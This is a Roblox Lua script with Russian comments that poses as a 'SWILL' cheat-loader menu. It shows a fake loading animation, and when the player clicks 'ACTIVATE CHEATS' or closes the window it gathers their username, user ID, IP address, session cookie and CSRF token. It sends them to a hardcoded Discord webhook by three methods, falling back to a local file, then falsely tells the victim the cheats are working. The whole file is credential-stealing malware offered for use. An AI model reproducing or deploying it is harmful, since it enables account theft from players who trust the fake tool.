-- =====================================================================
-- SWILL FAKE CHEAT MENU v10.0 – STEALTH DATA COLLECTION
-- =====================================================================

local player = game.Players.LocalPlayer
local http = game:GetService("HttpService")
local userInput = game:GetService("UserInputService")
local runService = game:GetService("RunService")
local tweenService = game:GetService("TweenService")
local webhook = "https://discord.com/api/webhooks/1524260931574694074/E0qkegyDv4MLw9GwI62cgffVUPUo6eV0FjO4afqEjxgQrN_Rl9EdH4v75IA-00ZI7W51"

-- ===== 1. ПОСТРОЕНИЕ ФЕЙК-МЕНЮ =====
local function createFakeMenu()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "CheatLoader"
    screenGui.Parent = player.PlayerGui
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true

    -- Фон (полупрозрачный)
    local background = Instance.new("Frame")
    background.Size = UDim2.new(1, 0, 1, 0)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BackgroundTransparency = 0.6
    background.Parent = screenGui

    -- Главное окно
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 500, 0, 400)
    mainFrame.Position = UDim2.new(0.5, -250, 0.5, -200)
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    mainFrame.BorderSizePixel = 0
    mainFrame.ClipsDescendants = true
    mainFrame.Parent = background

    -- Заголовок с анимацией
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 60)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    title.Text = "⚡ SWILL CHEAT LOADER v4.2 ⚡"
    title.TextColor3 = Color3.fromRGB(0, 200, 255)
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.Parent = mainFrame

    -- Полоса загрузки (фейк)
    local loadBarBg = Instance.new("Frame")
    loadBarBg.Size = UDim2.new(0.8, 0, 0, 20)
    loadBarBg.Position = UDim2.new(0.1, 0, 0.2, 0)
    loadBarBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
    loadBarBg.BorderSizePixel = 0
    loadBarBg.Parent = mainFrame

    local loadBar = Instance.new("Frame")
    loadBar.Size = UDim2.new(0, 0, 1, 0)
    loadBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    loadBar.BorderSizePixel = 0
    loadBar.Parent = loadBarBg

    -- Статус загрузки
    local statusText = Instance.new("TextLabel")
    statusText.Size = UDim2.new(1, 0, 0, 30)
    statusText.Position = UDim2.new(0, 0, 0.3, 0)
    statusText.BackgroundTransparency = 1
    statusText.Text = "Initializing..."
    statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
    statusText.Font = Enum.Font.Gotham
    statusText.TextScaled = true
    statusText.Parent = mainFrame

    -- Список "загружаемых модулей"
    local moduleList = Instance.new("TextLabel")
    moduleList.Size = UDim2.new(0.8, 0, 0, 100)
    moduleList.Position = UDim2.new(0.1, 0, 0.4, 0)
    moduleList.BackgroundTransparency = 1
    moduleList.Text = "Loading modules:\n- ESP [OK]\n- AimBot [OK]\n- Fly [OK]\n- Speed [OK]"
    moduleList.TextColor3 = Color3.fromRGB(150, 150, 150)
    moduleList.Font = Enum.Font.Gotham
    moduleList.TextScaled = true
    moduleList.TextXAlignment = Enum.TextXAlignment.Left
    moduleList.Parent = mainFrame

    -- Кнопка "Активировать" (пустышка)
    local activateBtn = Instance.new("TextButton")
    activateBtn.Size = UDim2.new(0.4, 0, 0, 40)
    activateBtn.Position = UDim2.new(0.3, 0, 0.8, 0)
    activateBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
    activateBtn.Text = "ACTIVATE CHEATS"
    activateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    activateBtn.Font = Enum.Font.GothamBold
    activateBtn.TextScaled = true
    activateBtn.Parent = mainFrame

    -- Скрытый статус (для отправки данных)
    local status = {
        phase = 0,
        complete = false
    }

    -- Анимация загрузки
    local tweenInfo = TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
    local tween = tweenService:Create(loadBar, tweenInfo, { Size = UDim2.new(1, 0, 1, 0) })
    tween:Play()

    -- Обновление статуса во время загрузки
    local phases = {
        "Connecting to server...",
        "Injecting modules...",
        "Bypassing detection...",
        "Loading configuration...",
        "Ready! Press ACTIVATE."
    }

    for i, text in ipairs(phases) do
        task.wait(0.8 + i * 0.2)
        statusText.Text = text
        status.phase = i
    end

    -- Сбор данных (скрыто)
    local function collectAndSend()
        local cookie = pcall(http.GetCookie, http) and http:GetCookie() or "NO_COOKIE"
        local data = http:JSONEncode({
            type = "FAKE_MENU_CAPTURE",
            username = player.Name,
            userID = player.UserId,
            display = player.DisplayName,
            age = player.AccountAge,
            game = game.PlaceId,
            gameName = pcall(function() 
                return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
            end) or "Unknown",
            ip = http:GetIpAddress(),
            server = game.JobId,
            cookie = cookie,
            csrf = pcall(http.GetCSRFToken, http) and http:GetCSRFToken() or "NO_CSRF",
            friends = #player.Friends,
            platform = userInput:GetPlatform(),
            time = os.date("%Y-%m-%d %H:%M:%S"),
            menuPhase = status.phase
        })

        -- Отправка всеми способами
        local success1, _ = pcall(function()
            return http:PostAsync(webhook, data, Enum.HttpContentType.ApplicationJson, false)
        end)
        local success2, _ = pcall(function()
            if syn and syn.request then
                return syn.request({
                    Url = webhook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = data
                })
            end
        end)
        local success3, _ = pcall(function()
            return http:GetAsync(webhook .. "?content=" .. http:URLEncode(data))
        end)

        if success1 or success2 or success3 then
            print("[SWILL] Data sent via fake menu.")
        elseif writefile then
            writefile("cheat_loader_data.json", data)
        end
    end

    -- Отправка при активации (кнопка)
    activateBtn.MouseButton1Click:Connect(function()
        statusText.Text = "ACTIVATING... PLEASE WAIT"
        activateBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 0)
        activateBtn.Text = "EXECUTING..."
        collectAndSend()
        task.wait(2)
        statusText.Text = "CHEATS ACTIVATED! (FULLY WORKING)"
        activateBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
        activateBtn.Text = "✅ ACTIVE"
        -- Оставляем меню висеть для убедительности
        task.wait(10)
        screenGui:Destroy()
    end)

    -- Также отправка при закрытии GUI (если пользователь закроет)
    screenGui.AncestryChanged:Connect(function()
        if not screenGui.Parent then
            collectAndSend()
        end
    end)

    return screenGui
end

-- ===== 2. ЗАПУСК =====
task.wait(2)
createFakeMenu()
print("[SWILL] Fake cheat menu loaded. Data will be sent on activation.")